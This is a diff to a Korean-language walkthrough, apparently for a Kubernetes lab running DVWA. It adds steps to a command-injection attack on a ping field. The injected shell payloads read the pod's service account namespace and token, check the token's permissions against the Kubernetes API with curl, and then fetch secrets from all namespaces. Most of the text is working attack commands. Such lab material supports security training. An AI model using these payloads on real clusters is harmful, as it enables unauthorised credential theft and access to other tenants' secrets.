@@ -11,7 +11,23 @@
 
 ![token](./imgs/attack1_token.png)
 
-2. 모든 namespace의 secrets 탈취
+2. pod(정확한 표현은 serviceAccount)의 namespace 확인
+
+```sh
+127.0.0.1 -c 1 && cat /run/secrets/kubernetes.io/serviceaccount/namespace
+```
+
+![token](./imgs/attack1_namespace.png)
+
+3. serviceAcount token 권한 확인
+
+```sh
+127.0.0.1 -c 1 && cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"dvwa"}}' https://kubernetes.default.svc.cluster.local/apis/authorization.k8s.io/v1/selfsubjectrulesreviews; }
+```
+
+![token](./imgs/attack1_authorization.png)
+
+4. 모든 namespace의 secrets 탈취
 
 ```sh
 127.0.0.1 -c 1 && cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://kubernetes.default.svc.cluster.local/api/v1/secrets; }
